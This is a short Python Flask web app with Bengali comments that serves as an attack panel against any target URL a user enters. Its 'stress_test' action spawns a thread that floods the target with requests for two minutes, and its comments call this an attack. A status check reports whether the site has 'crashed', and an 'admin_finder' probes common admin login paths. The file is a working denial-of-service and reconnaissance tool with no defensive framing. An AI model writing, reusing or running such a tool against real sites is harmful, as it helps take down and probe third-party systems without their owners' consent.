import requests
import threading
import time
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# অ্যাটাক ফাংশন (২ মিনিটের জন্য)
def attack_logic(url):
    timeout = time.time() + 120  # ১২০ সেকেন্ড বা ২ মিনিট
    while time.time() < timeout:
        try:
            # দ্রুত রিকোয়েস্ট পাঠানোর জন্য
            requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
        except:
            pass

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/tools', methods=['POST'])
def tools():
    data = request.json
    action = data.get('action')
    target = data.get('target')

    if action == "stress_test":
        # থ্রেড ব্যবহার করে ব্যাকগ্রাউন্ডে অ্যাটাক শুরু
        thread = threading.Thread(target=attack_logic, args=(target,))
        thread.start()
        return jsonify({"status": "Attacking started for 2 minutes..."})

    elif action == "check_status":
        try:
            res = requests.get(target, timeout=10)
            if res.status_code >= 500:
                return jsonify({"status": "OFFLINE / CRASHED"})
            else:
                return jsonify({"status": f"ONLINE (Code: {res.status_code}) - NOT CRASHED"})
        except:
            return jsonify({"status": "OFFLINE / CRASHED"})

    elif action == "admin_finder":
        # API ছাড়া লোকাল লিস্ট দিয়ে অ্যাডমিন প্যানেল চেক
        admin_paths = ['/admin', '/login.php', '/wp-admin', '/dashboard', '/controlpanel']
        found = []
        for path in admin_paths:
            try:
                r = requests.get(target + path, timeout=3)
                if r.status_code == 200:
                    found.append(path)
            except: pass
        return jsonify({"status": f"Found: {', '.join(found) if found else 'None'}"})

if __name__ == '__main__':
    app.run(debug=True)